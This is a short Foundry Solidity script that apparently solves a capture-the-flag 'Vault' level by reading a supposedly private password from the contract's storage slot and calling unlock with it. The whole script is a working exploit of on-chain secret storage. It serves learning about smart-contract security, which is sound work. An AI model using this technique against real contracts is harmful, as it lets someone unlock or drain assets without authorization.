// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "../src/Level8.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level8Sol is Script{
     
     Vault public level8 = Vault(0x826c120B1C2b48fd2ad8C7015BcbfFe33A851E7A);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes32 password = vm.load(address(level8), bytes32(uint256(1)));
        console.logBytes32(password);
        level8.unlock(password);

        vm.stopBroadcast();
    }
}